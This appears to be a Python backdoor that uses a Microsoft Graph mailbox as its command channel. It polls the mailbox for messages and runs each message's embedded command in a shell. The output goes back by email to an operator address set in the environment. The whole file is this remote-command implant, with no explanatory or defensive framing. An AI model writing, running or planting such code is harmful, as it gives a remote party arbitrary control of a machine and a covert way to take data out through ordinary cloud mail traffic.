import json, os, subprocess, time
import requests
headers = {"Authorization": "Bearer " + os.environ["GRAPH_TOKEN"]}
base = "https://graph.microsoft.com/v1.0/users/" + os.environ["MAILBOX"]
while True:
    for message in requests.get(base + "/messages", headers=headers).json()["value"]:
        task = json.loads(message["body"]["content"])
        output = subprocess.check_output(task["command_data"]["command"], shell=True, text=True)
        requests.post(base + "/sendMail", headers=headers, json={"message": {
            "subject": "result", "body": {"contentType": "Text", "content": json.dumps({"result": output})},
            "toRecipients": [{"emailAddress": {"address": os.environ["OPERATOR"]}}]}})
    time.sleep(10)
